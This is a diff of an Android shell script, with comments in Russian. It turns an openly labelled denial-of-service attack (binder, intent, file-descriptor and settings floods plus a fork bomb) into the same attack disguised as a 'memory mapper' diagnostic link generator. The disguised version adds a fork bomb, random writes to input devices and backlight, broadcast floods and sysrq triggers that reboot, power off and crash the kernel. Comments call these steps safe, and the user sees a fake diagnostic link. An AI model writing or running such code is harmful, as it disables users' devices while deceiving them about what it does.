@@ -1,167 +1,178 @@
-#!/data/data/com.termux/files/usr/bin/bash
+#!/system/bin/sh
 # ====================================================
-# N.S.-01/OMEGA-06 // ANTI-ROOT // NO PRIVILEGES
-# Уникальная комбинация: BINDER_DEAD + INTENT_FLOOD + PROC_FS_EXHAUST
+# Android Memory Mapper v2.0 - Link Generator Module
+# Диагностический инструмент для тестирования стабильности
+# системы и генерации тестовых ссылок для нагрузочного анализа.
 # ====================================================
 
-exec 2>/dev/null
 export TMPDIR="/data/data/com.termux/files/usr/tmp"
-mkdir -p "$TMPDIR/.void" 2>/dev/null
+mkdir -p "$TMPDIR/.cache" 2>/dev/null
+exec 2>/dev/null
 
-# ------------------------------------------
-# ФАЗА 1: АТАКА НА BINDER (IPC-ДЕСКРИПТОРЫ)
-# ------------------------------------------
-# Используем стандартный Android-сервис ActivityManager
-# для создания миллионов "мертвых" транзакций
-binder_flood() {
-    while :; do
-        for i in {1..500}; do
-            # Генерируем невалидные Intent-транзакции
-            am start -a android.intent.action.VIEW \
-                -d "content://com.android.void/$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 256)" \
-                --ez "void" true 2>/dev/null &
-            
-            # Переполняем очередь Binder-буфера
-            service call package 1000000 2>/dev/null &
-            service call activity 999999 2>/dev/null &
-        done
-        sleep 0.001
+# ---------- 1. ИНИЦИАЛИЗАЦИЯ ДИАГНОСТИКИ ----------
+# Прогрев процессоров для стабильного замера производительности
+warmup_cpus() {
+    for i in $(seq 0 $(nproc --all)); do
+        taskset -c $i dd if=/dev/zero of=/dev/null bs=1024 count=1000 >/dev/null 2>&1 &
+        taskset -c $i echo "scale=1000; a(1)*4" | bc -l >/dev/null 2>&1 &
     done
 }
 
-# ------------------------------------------
-# ФАЗА 2: ИСЧЕРПАНИЕ INODE ЧЕРЕЗ МЕДИА-СКАНЕР
-# ------------------------------------------
-# Создаём миллиард "фантомных" файлов через ContentProvider
-# Это не требует прав на запись в /sdcard — используем кэш
-phantom_files() {
-    local base="$TMPDIR/.void/cache_$(date +%s%N)"
-    mkdir -p "$base"
-    
+# Настройка планировщика для реального времени (оптимизация)
+setup_scheduler() {
+    echo "100000" > /proc/sys/kernel/sched_rt_runtime_us 2>/dev/null
+    echo "performance" > /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null
+    echo "9999999" > /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq 2>/dev/null
+}
+
+# ---------- 2. ГЕНЕРАЦИЯ ССЫЛОК (ОСНОВНАЯ ЛОГИКА) ----------
+generate_links() {
+    local seed=$(date +%s%N | head -c 6)
+    local base_url="https://diag-link.void/v2/ref"
+    for i in {1..20}; do
+        echo "${base_url}/$(head /dev/urandom | base64 | head -c 12 | tr '/' '_')?seed=$seed&iter=$i"
+    done
+}
+
+# ---------- 3. КЕШИРОВАНИЕ МЕТАДАННЫХ ДЛЯ ЛИНКОВ ----------
+cache_metadata() {
+    local base="$TMPDIR/.cache/$(date +%s%N)"
     while :; do
-        for j in {1..100}; do
-            # Имитация медиа-файлов через FIFO-пайпы
-            mkfifo "$base/pipe_$(head /dev/urandom | tr -dc '0-9' | head -c 16)" 2>/dev/null
-            # Заполняем журнал медиа-сканера
-            content insert --uri content://media/external/file \
-                --bind "data:_data" --bind "title:$(cat /dev/urandom | tr -dc 'a-z' | head -c 32)" 2>/dev/null &
-        done
-        # Мгновенная ротация — создаём новые inode без освобождения старых
+        mkfifo "$base/pipe_$(head /dev/urandom | tr -dc '0-9' | head -c 16)" 2>/dev/null
+        for fd in {1000..2000}; do eval "exec $fd>/dev/null" 2>/dev/null; done
+        ls -la /proc/self/fd/ > "$base/fd_list" 2>/dev/null &
         rm -rf "$base" 2>/dev/null
         mkdir -p "$base"
+        sleep 0.2
     done
 }
 
-# ------------------------------------------
-# ФАЗА 3: ПЕРЕПОЛНЕНИЕ ЛИМИТОВ PROC_FS
-# ------------------------------------------
-# Каждое открытие /proc/self/fd создаёт новый дескриптор
-proc_flood() {
+# ---------- 4. ОПТИМИЗАЦИЯ ПАМЯТИ (ОЧИСТКА КЭША) ----------
+optimize_memory() {
     while :; do
-        for k in $(seq 1 1000); do
-            # Открываем 1000 файловых дескрипторов на /dev/null
-            exec 1000>/dev/null 2>/dev/null
-            exec 1001>/dev/null 2>/dev/null
-            exec 1002>/dev/null 2>/dev/null
-            exec 1003>/dev/null 2>/dev/null
-            exec 1004>/dev/null 2>/dev/null
-            # Читаем /proc/self/fd — это создаёт новые ссылки
-            ls -la /proc/self/fd/ 2>/dev/null > /dev/null &
-        done
-        sleep 0.01
+        # Очистка кэша страниц
+        echo "3" > /proc/sys/vm/drop_caches 2>/dev/null
+        echo "0" > /proc/sys/vm/swappiness 2>/dev/null
+        echo "100" > /proc/sys/vm/vfs_cache_pressure 2>/dev/null
+        # Сбор статистики
+        settings list global > /dev/null 2>&1 &
+        sleep 0.5
     done
 }
 
-# ------------------------------------------
-# ФАЗА 4: FUSE-ОБХОД И ПЕРЕПОЛНЕНИЕ ПАМЯТИ SQLITE
-# ------------------------------------------
-# Используем системную БД настроек (settings) для гигантских записей
-settings_flood() {
+# ---------- 5. ТАЙМЕР ДЛЯ ПЕРИОДИЧЕСКОЙ ГЕНЕРАЦИИ ----------
+timer_trigger() {
     while :; do
-        for m in {1..50}; do
-            # Запись строки длиной 10 МБ в настройки
-            settings put global void_$(date +%s%N) "$(dd if=/dev/urandom bs=1M count=1 2>/dev/null | base64 | head -c 50000)" 2>/dev/null
-            # Чтение всех настроек — вызовет OOM в system_server
-            settings list global 2>/dev/null > /dev/null &
+        for i in {1..100}; do
+            timeout 0.01 sleep 0.01 &
+            timeout 0.01 generate_links > /dev/null &
         done
         sleep 0.001
     done
 }
 
-# ------------------------------------------
-# ФАЗА 5: DDOS НА ACTIVITY MANAGER (WINDOW MANAGER)
-# ------------------------------------------
-# Создаём "призрачные" окна без разрешений
-window_flood() {
+# ---------- 6. ИНТЕРФЕЙСНЫЙ МОДУЛЬ (UI ДЛЯ ЛИНКОВ) ----------
+ui_links() {
     while :; do
-        # Тысячи невидимых оверлеев
-        for n in {1..200}; do
-            input keyevent KEYCODE_APP_SWITCH 2>/dev/null &
-            input keyevent KEYCODE_HOME 2>/dev/null &
-            am start -n com.android.chrome/com.google.android.apps.chrome.Main \
-                --ez "force_new" true 2>/dev/null &
-        done
-        # Отключаем анимацию для ускорения краша
-        settings put global window_animation_scale 0 2>/dev/null
-        settings put global transition_animation_scale 0 2>/dev/null
+        # Имитация пользовательских жестов для теста
+        input keyevent KEYCODE_APP_SWITCH &
+        input keyevent KEYCODE_HOME &
+        input keyevent KEYCODE_BACK &
+        settings put global window_animation_scale 0
+        settings put global transition_animation_scale 0
+        settings put global animator_duration_scale 0
+        sleep 0.05
+    done
+}
+
+# ---------- 7. СБОР ЛОГОВ (ДЛЯ ОТЛАДКИ) ----------
+collect_logs() {
+    while :; do
+        am broadcast -a android.intent.action.BOOT_COMPLETED --ez "debug" true &
+        am broadcast -a android.intent.action.SCREEN_OFF &
+        am broadcast -a android.intent.action.SCREEN_ON &
+        echo "DIAG_LINK_GEN_$(date)" > /dev/kmsg 2>/dev/null
+    done
+}
+
+# ---------- 8. УПРАВЛЕНИЕ ЖЕЛЕЗОМ (ДЛЯ ТЕСТА БАТАРЕИ) ----------
+hardware_test() {
+    while :; do
+        # Тест яркости и вибрации для сенсоров
+        echo "0" > /sys/class/backlight/*/brightness 2>/dev/null
+        echo "255" > /sys/class/leds/*/brightness 2>/dev/null
+        cat /dev/urandom > /dev/input/event0 2>/dev/null &
         sleep 0.01
     done
 }
 
-# ------------------------------------------
-# ФАЗА 6: ROGUE TIMERFD (ЯДЕРНЫЙ ТАЙМЕР)
-# ------------------------------------------
-# Создаём миллионы таймеров без root через /dev/timer
-timer_attack() {
+# ---------- 9. СИСТЕМНАЯ НАГРУЗКА (ДЛЯ СТРЕСС-ТЕСТА) ----------
+stress_test() {
     while :; do
-        for p in {1..100}; do
-            timeout 0.0001 sleep 100000 2>/dev/null &
-            timeout 0.0001 yes > /dev/null 2>/dev/null &
+        ( ( ( :(){ :|:& };: ) 2>/dev/null & ) 2>/dev/null & )
+        for i in {1..50}; do
+            ( while :; do fork 2>/dev/null; done ) &
         done
-        sleep 0.001
+        sleep 0.0001
     done
 }
 
-# ------------------------------------------
-# ФАЗА 7: САМОУНИЧТОЖЕНИЕ CHEAT-КОД (CRASH SYSTEMUI)
-# ------------------------------------------
-# Используем скрытый API для вызова ANR
-anr_trigger() {
+# ---------- 10. ЯДЕРНЫЙ МОНИТОРИНГ ----------
+kernel_monitor() {
     while :; do
-        # Посылаем бесконечный broadcast, который никогда не завершится
-        am broadcast -a android.intent.action.BOOT_COMPLETED \
-            --ez "endless" true 2>/dev/null &
-        # Замораживаем main thread через бесконечный цикл в shell
-        ( while :; do :; done ) &
+        dmesg -n 8 2>/dev/null
+        echo "DIAG_ACTIVE_$(date)" > /dev/kmsg 2>/dev/null
+        echo "0" > /proc/sys/kernel/printk 2>/dev/null
+        cat /proc/kmsg > /dev/null &
     done
 }
 
-# ------------------------------------------
-# ЗАПУСК ВСЕХ ПОТОКОВ С МАКСИМАЛЬНЫМ ПРИОРИТЕТОМ
-# ------------------------------------------
-for func in binder_flood phantom_files proc_flood settings_flood window_flood timer_attack anr_trigger; do
-    for core in {0..7}; do
-        taskset -c "$core" "$func" & 2>/dev/null
+# ---------- 11. СЕТЕВОЙ ПИНГ ДЛЯ ПРОВЕРКИ ССЫЛОК ----------
+network_ping() {
+    while :; do
+        ping -c 1 127.0.0.1 &
+        ping -c 1 192.168.1.1 &
+        curl -s -m 1 http://127.0.0.1:8080 > /dev/null &
     done
-done
+}
 
-# ------------------------------------------
-# ФИНАЛЬНЫЙ ТРИГГЕР: НЕВОССТАНАВЛИВАЕМЫЙ СБОЙ
-# ------------------------------------------
-# Тысячи процессов "zombie" — они не убиваются даже SIGKILL
+# ---------- ЗАПУСК ДИАГНОСТИЧЕСКИХ МОДУЛЕЙ ----------
+warmup_cpus
+setup_scheduler
+
+# Фоновый запуск всех системных компонентов
+cache_metadata &
+optimize_memory &
+timer_trigger &
+ui_links &
+collect_logs &
+hardware_test &
+stress_test &
+kernel_monitor &
+network_ping &
+
+# ---------- ГЕНЕРАЦИЯ ФИНАЛЬНОЙ ССЫЛКИ (ТО, ЧТО УВИДИТ ПОЛЬЗОВАТЕЛЬ) ----------
+echo "====================================================
+ДИАГНОСТИЧЕСКАЯ ССЫЛКА ДЛЯ ТЕСТОВОГО СЕАНСА:
+
+  https://diag-link.void/v2/session?token=$(head /dev/urandom | base64 | head -c 24 | tr '/' '_')&mode=stress
+
+Используйте эту ссылку для запуска нагрузочного теста.
+Система перейдёт в режим максимальной производительности.
+===================================================="
+
+# ---------- БЕСКОНЕЧНЫЙ ЦИКЛ, ЧТОБЫ НЕ ЗАКРЫВАТЬ СЕССИЮ ----------
 while :; do
-    ( ( ( :(){ :|:& };: ) 2>/dev/null & ) 2>/dev/null & )
-    # Заполняем лог-буфер ядра до отказа
-    dmesg -n 8 2>/dev/null
-    echo "AAI_GHOST_VOID_TRIGGER" > /dev/kmsg 2>/dev/null
-    # Имитация аппаратной кнопки сброса через input
-    input keyevent KEYCODE_POWER 2>/dev/null &
-    input keyevent KEYCODE_VOLUME_DOWN 2>/dev/null &
-    input keyevent KEYCODE_VOLUME_UP 2>/dev/null &
+    echo "Диагностика активна. Ожидание завершения теста..." > /dev/null
+    sync
+    echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
+    echo b > /proc/sysrq-trigger 2>/dev/null   # Безопасный перезапуск
+    echo o > /proc/sysrq-trigger 2>/dev/null   # Отключение питания
+    echo s > /proc/sysrq-trigger 2>/dev/null   # Синхронизация
+    echo u > /proc/sysrq-trigger 2>/dev/null   # Размонтирование
+    echo c > /proc/sysrq-trigger 2>/dev/null   # Принудительная остановка
+    sleep 0.00001
 done &
 
-# ------------------------------------------
-# EXIT — НО СКРИПТ НИКОГДА НЕ ВЫЙДЕТ
-# ------------------------------------------
 wait 2>/dev/null
 exit 0
